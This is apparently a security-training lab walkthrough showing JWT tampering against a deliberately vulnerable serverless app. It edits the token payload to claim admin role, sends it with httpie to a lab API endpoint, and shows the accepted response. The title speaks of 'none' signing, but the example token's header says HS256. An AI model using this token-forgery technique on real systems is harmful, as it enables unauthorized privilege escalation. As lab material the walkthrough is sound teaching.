# **`None` Signed Token**

---

### **Lab Image : `Serverless`**

---

#### Step 1:

* Access the [XML-Uploader](http://sls-training-ui.s3-website-us-east-1.amazonaws.com/) Application on the browser.

```commandline
http://sls-training-ui.s3-website-us-east-1.amazonaws.com/
```

* Register and Login to the Application

> **NOTE**: The details provided CAN be fake and we highly recommend it!*

---

#### Step 2:

* Once logged in, copy the value of `token` that can be found in `Local Storage` under the `Storage` section in `developer tools`

* Paste the token on [jwt.io](https://jwt.io/) and tamper the value in `Payload` section

```commandline
{
"username": "admin",
"role": "admin",
"email": "admin@widget.co"
}
```

* Using the tampered token, try to access the application using `http` on the provisioned server

```commandline
http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:<token>
```

* It should return with a response similar to the one below:

> **EXAMPLE**:

```text
root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJhZG1pbkB3aWRnZXQuY28ifQ.PSIL13J1t8Rrfd33fxgO2X3EaDaFQcsa0S3dAi07GLU
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,Authorization,X-Amz-Date,X-Api-Key,X-Amz-Security-Token
Access-Control-Allow-Methods: GET,OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 0
Connection: keep-alive
Content-Length: 73
Content-Type: application/json
Date: Tue, 02 Apr 2019 16:32:05 GMT
Via: 1.1 5bc1c4711561ec9e65e05f2ef18f000a.cloudfront.net (CloudFront)
X-Amz-Cf-Id: yLaZex5YV7JTNFJoZrvlauQwCftBBi3Gpp2MP7rIAoGFd0MCIiBJ5g==
X-Amzn-Trace-Id: Root=1-5baa6305-3c51c12dc7373ad2db05ab16;Sampled=1
X-Cache: Miss from cloudfront
x-amz-apigw-id: NyRo5FXGIAMFpfg=
x-amzn-RequestId: 8a1c7c11-c0e0-11e8-9e6d-b3dfa2e0c648

{
    "decoded": {
        "email": "admin@widget.co", 
        "role": "admin", 
        "username": "admin"
    }
}
```
